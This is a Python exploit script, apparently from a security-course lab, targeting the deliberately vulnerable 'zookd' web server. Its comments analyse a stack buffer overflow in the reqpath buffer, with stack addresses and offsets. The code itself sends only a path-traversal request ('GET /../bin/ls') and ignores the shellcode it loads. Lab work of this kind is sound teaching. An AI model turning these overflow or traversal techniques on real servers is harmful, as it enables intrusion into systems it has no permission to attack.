#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

# EXPLOIT TARGETED:
#
# [zookd.c:65]
# The "char reqpath[2048]" variable may be overflown when used in the function
# "http_request_line", which is called on line 70:
#
#     <if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))>
#
# In http.c:105, the call to "url_decode(reqpath, sp1);" may cause this overflow.
# The url_decode function will copy the target URI from the HTTP request into
# "reqpath" without paying attention to the size of "reqpath". The URI could be
# about 8000 bytes long and clearly overflow the buffer.
#
# We could simply make a request containing a very long target URI to exploit this
# vulnerability.
#
# This vulnerability can be protected using stack canaries.
#
#
# STACK LAYOUT:
# During execution of "process_client"
#
# -----------------
# |                |
# |   return       |
# |   addr         |
# |  0x08048ec6    | <- 0xbffff61c
#  -----------------
# |                |
# |  saved frame   | 4 bytes
# |  pointer       |
# |                | <- 0xbffff618
#  -----------------
# |   ?            |
# |                | 4 bytes
# |                |
# |                | <- 0xbffff614
# -----------------
# |   ?            |
# |                | 4 bytes
# |                |
# |                | <- 0xbffff610
# -----------------
# |                |
# |    int i       | 4 bytes
# |                |
# |                | <- 0xbffff60c
# -----------------
# |                |
# |    char *      |  4 bytes
# |    errmsg      |
# |                | <- 0xbffff608
# -----------------
# |                |
# |    reqpath     |  2048 bytes
# |    buffer      |
# |                | <- 0xbfffee08
# -----------------
# |                |
#
# So the first extra 20 bytes overflow local variables.
# The next 4 extra bytes overflow the return address.

def build_exploit(shellcode):
    req = "GET " + "/../bin/ls" +" HTTP/1.0"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
